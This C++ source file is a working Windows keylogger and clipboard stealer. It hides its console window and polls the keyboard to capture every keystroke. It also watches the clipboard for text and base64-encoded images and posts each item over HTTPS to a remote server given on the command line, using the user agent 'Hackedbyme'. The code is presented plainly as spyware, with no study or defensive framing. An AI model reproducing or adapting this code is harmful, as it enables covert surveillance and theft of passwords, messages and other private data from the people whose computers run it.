#include <windows.h>
#include <fstream>
#include <iostream>
#include <string>
#include <map>
#include <vector>
#include <cstring>
#include <thread>
#include <chrono>
#include <numeric> // For std::accumulate
#include <wininet.h>
#include <cstdio>
#include <memory>
#include <array>
#include <stdexcept>
#include <bitset>
#include <cstdlib>

#pragma comment(lib, "wininet.lib")

// type of data to be logged
std::string type;
// variable to store the exf data
std::string data_exf;
//remote server domain
std::string remote_server;

// Function to hide the console window
void hideConsole() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
}

// Function to initialize the Internet connection
HINTERNET InitializeInternet(const char* agent) {
    HINTERNET hInternet = InternetOpen(agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        std::cerr << "InternetOpen failed: " << GetLastError() << std::endl;
    }
    return hInternet;
}

// Function to connect to the server
HINTERNET ConnectToServer(HINTERNET hInternet, const char* serverAddress, int port) {
    //HINTERNET hConnect = InternetConnect(hInternet, serverAddress, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    HINTERNET hConnect = InternetConnect(hInternet, serverAddress, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        std::cerr << "InternetConnect failed: " << GetLastError() << std::endl;
    }
    return hConnect;
}

// Function to send a request and read the response
bool SendRequest(HINTERNET hConnect, const char* endpoint, const char* message) {
    //HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", endpoint, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
    HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", endpoint, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    if (!hRequest) {
        std::cerr << "HttpOpenRequest failed: " << GetLastError() << std::endl;
        return false;
    }

    // Send the request
    if (!HttpSendRequest(hRequest, NULL, 0, (LPVOID)message, strlen(message))) {
        std::cerr << "HttpSendRequest failed: " << GetLastError() << std::endl;
        InternetCloseHandle(hRequest);
        return false;
    }

    // Read the response
    char buffer[1024];
    DWORD bytesRead;
    while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        //std::cout << buffer;
        // globalData.append(buffer, bytesRead);
    }

    InternetCloseHandle(hRequest);
    return true;
}
int exf(const char* str_){
    // Initialize Internet
    HINTERNET hInternet = InitializeInternet("Hackedbyme");
    if (!hInternet) return 1;

    // Connect to the server
    HINTERNET hConnect = ConnectToServer(hInternet, remote_server.c_str(),INTERNET_DEFAULT_HTTPS_PORT);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Send message to the server
    if (!SendRequest(hConnect, "/", str_)) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Clean up
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return 1;
}

// Function to log a single character key to a file
void logKey(char key) {
    std::ofstream logfile;
    //logfile.open("keylog.txt", std::ios::app);
    //logfile << key;
    //logfile.close();
    type = "keystroke:";
    data_exf = type + std::string(1,key);
    exf(data_exf.c_str());
}

// Function to log a string (e.g., "[ESC]") to a file
void logString(const std::string& str) {
    std::ofstream logfile;
    // logfile.open("keylog.txt", std::ios::app);
    // logfile << str;
    // logfile.close();
    type = "keystroke:";
    data_exf = type + str;
    exf(data_exf.c_str());
}

// Function to process special keys and log them
void processSpecialKeys(int key, bool shiftPressed) {
    std::map<int, std::string> specialKeys = {
        {VK_SPACE, "[SPACE]"},
        {VK_RETURN, "[ENTER]"},
        {VK_SHIFT, "[SHIFT]"},
        {VK_BACK, "[BACKSPACE]"},
        {VK_TAB, "[TAB]"},
        {VK_ESCAPE, "[ESC]"},
        {VK_LEFT, "[LEFT]"},
        {VK_RIGHT, "[RIGHT]"},
        {VK_UP, "[UP]"},
        {VK_DOWN, "[DOWN]"},
        {VK_CONTROL, "[CTRL]"},
        {VK_MENU, "[ALT]"},
        {VK_CAPITAL, "[CAPSLOCK]"},
        {VK_PRIOR, "[PAGEUP]"},
        {VK_NEXT, "[PAGEDOWN]"},
        {VK_END, "[END]"},
        {VK_HOME, "[HOME]"},
        {VK_INSERT, "[INSERT]"},
        {VK_DELETE, "[DELETE]"}
    };

    if (specialKeys.find(key) != specialKeys.end()) {
        logString(specialKeys[key]);
    } else if (key >= '0' && key <= '9') {
        // Handle number keys and shifted number keys for special characters
        switch (key) {
            case '1': logKey(shiftPressed ? '!' : '1'); break;
            case '2': logKey(shiftPressed ? '@' : '2'); break;
            case '3': logKey(shiftPressed ? '#' : '3'); break;
            case '4': logKey(shiftPressed ? '$' : '4'); break;
            case '5': logKey(shiftPressed ? '%' : '5'); break;
            case '6': logKey(shiftPressed ? '^' : '6'); break;
            case '7': logKey(shiftPressed ? '&' : '7'); break;
            case '8': logKey(shiftPressed ? '*' : '8'); break;
            case '9': logKey(shiftPressed ? '(' : '9'); break;
            case '0': logKey(shiftPressed ? ')' : '0'); break;
        }
    } else if (key >= 'A' && key <= 'Z') {
        // Handle alphabet keys, accounting for shift
        logKey(shiftPressed ? key : key + 32); // Convert to lowercase if shift is not pressed
    } else {
        // Handle other special characters
        switch (key) {
            case VK_OEM_1: logKey(shiftPressed ? ':' : ';'); break; // ;:
            case VK_OEM_2: logKey(shiftPressed ? '?' : '/'); break; // /?
            case VK_OEM_3: logKey(shiftPressed ? '~' : '`'); break; // `~
            case VK_OEM_4: logKey(shiftPressed ? '{' : '['); break; // [{
            case VK_OEM_5: logKey(shiftPressed ? '|' : '\\'); break; // \|
            case VK_OEM_6: logKey(shiftPressed ? '}' : ']'); break; // ]}
            case VK_OEM_7: logKey(shiftPressed ? '"' : '\''); break; // '"
            case VK_OEM_PERIOD: logKey(shiftPressed ? '>' : '.'); break; // .>
            case VK_OEM_COMMA: logKey(shiftPressed ? '<' : ','); break; // ,<
            default: logString("[UNKNOWN]"); break;
        }
    }
}

// Function to capture keystrokes
void captureKeystrokes() {
    std::map<int, bool> keyState; // Keeps track of key states (pressed/released)

    while (true) {
        bool shiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;

        for (int key = 8; key <= 255; key++) {
            SHORT state = GetAsyncKeyState(key);
            bool isPressed = (state & 0x8000) != 0; // Check if key is pressed

            if (isPressed && !keyState[key]) {
                // Key was just pressed
                if ((key >= '0' && key <= '9') || (key >= 'A' && key <= 'Z') || (key >= VK_OEM_1 && key <= VK_OEM_3)) {
                    // Handle printable ASCII characters and special characters
                    processSpecialKeys(key, shiftPressed);
                } else {
                    // Handle other special keys
                    processSpecialKeys(key, shiftPressed);
                }
                keyState[key] = true; // Mark key as pressed
            } else if (!isPressed && keyState[key]) {
                // Key was just released
                keyState[key] = false; // Mark key as released
            }
        }
        Sleep(10); // Slight delay to prevent high CPU usage
    }
}

// Simple Base64 Encoding Function
std::string base64_encode(const std::vector<BYTE>& data) {
    static const char* base64_chars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";
    
    std::string ret;
    int val=0, valb=-6;
    for (BYTE c : data) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            ret.push_back(base64_chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) ret.push_back(base64_chars[((val << 8) >> valb) & 0x3F]);
    while (ret.size() % 4) ret.push_back('=');
    return ret;
}

void saveClipboardDataToFile(const std::string& textFilename, const std::string& imageFilename) {
    if (!OpenClipboard(nullptr)) {
        std::cerr << "Failed to open clipboard" << std::endl;
        return;
    }

    HANDLE hData = GetClipboardData(CF_TEXT);
    if (hData) {
        char* pszText = static_cast<char*>(GlobalLock(hData));
        if (pszText) {
            std::ofstream outFile(textFilename, std::ios::app); // Append to file
            outFile << pszText << std::endl;
            outFile.close();
            GlobalUnlock(hData);
        }
    } else {
        hData = GetClipboardData(CF_DIB);
        if (hData) {
            BITMAPINFO* pbi = static_cast<BITMAPINFO*>(GlobalLock(hData));
            if (pbi) {
                BITMAPINFOHEADER* pbih = &(pbi->bmiHeader);
                DWORD dwBmpSize = pbih->biSizeImage;

                std::vector<BYTE> bmpData(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize);
                BITMAPFILEHEADER* bmfHeader = reinterpret_cast<BITMAPFILEHEADER*>(bmpData.data());
                bmfHeader->bfType = 0x4D42;
                bmfHeader->bfSize = bmpData.size();
                bmfHeader->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

                BITMAPINFOHEADER* bmpInfoHeader = reinterpret_cast<BITMAPINFOHEADER*>(bmpData.data() + sizeof(BITMAPFILEHEADER));
                *bmpInfoHeader = *pbih;

                BYTE* imageData = bmpData.data() + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
                std::memcpy(imageData, reinterpret_cast<BYTE*>(pbi) + pbih->biSize, dwBmpSize);

                std::string encodedData = base64_encode(bmpData);

                std::ofstream outFile(imageFilename, std::ios::app); // Append to file
                outFile << encodedData << std::endl;
                outFile.close();
                GlobalUnlock(hData);
            }
        } else {
            std::cerr << "No text or image data on clipboard" << std::endl;
        }
    }

    CloseClipboard();
}

//void monitorClipboard(const std::string& textFilename, const std::string& imageFilename) {
void monitorClipboard() {

    std::string lastClipboardData;

    while (true) {
        if (!OpenClipboard(nullptr)) {
            std::cerr << "Failed to open clipboard" << std::endl;
            continue;
        }

        std::string currentClipboardData;
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData) {
            char* pszText = static_cast<char*>(GlobalLock(hData));
            if (pszText) {
                currentClipboardData = pszText;
                type = "clipboard:text:";
                GlobalUnlock(hData);
            }
        } else {
            hData = GetClipboardData(CF_DIB);
            if (hData) {
                BITMAPINFO* pbi = static_cast<BITMAPINFO*>(GlobalLock(hData));
                if (pbi) {
                    BITMAPINFOHEADER* pbih = &(pbi->bmiHeader);
                    DWORD dwBmpSize = pbih->biSizeImage;

                    std::vector<BYTE> bmpData(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize);
                    BITMAPFILEHEADER* bmfHeader = reinterpret_cast<BITMAPFILEHEADER*>(bmpData.data());
                    bmfHeader->bfType = 0x4D42;
                    bmfHeader->bfSize = bmpData.size();
                    bmfHeader->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

                    BITMAPINFOHEADER* bmpInfoHeader = reinterpret_cast<BITMAPINFOHEADER*>(bmpData.data() + sizeof(BITMAPFILEHEADER));
                    *bmpInfoHeader = *pbih;

                    BYTE* imageData = bmpData.data() + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
                    std::memcpy(imageData, reinterpret_cast<BYTE*>(pbi) + pbih->biSize, dwBmpSize);

                    currentClipboardData = base64_encode(bmpData);
                    type = "clipboard:image:";
                    GlobalUnlock(hData);
                }
            }
        }

        CloseClipboard();

        if (currentClipboardData != lastClipboardData) {
            lastClipboardData = currentClipboardData;
            data_exf = type + currentClipboardData;
            exf(data_exf.c_str());
            //saveClipboardDataToFile(textFilename, imageFilename); // Save new data
        }

        std::this_thread::sleep_for(std::chrono::seconds(1)); // Check every second
    }
}


int main(int argc, char* argv[]) {

    hideConsole();         // Hide the console window
    //remote server to receive data
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <remote_server>" << std::endl;
        return 1;
    }

    remote_server = argv[1];

    //create thread
    std::thread keystrokeThread(captureKeystrokes);
    std::thread clipboardThread(monitorClipboard);

    keystrokeThread.join();
    clipboardThread.join();

    return 0;
}
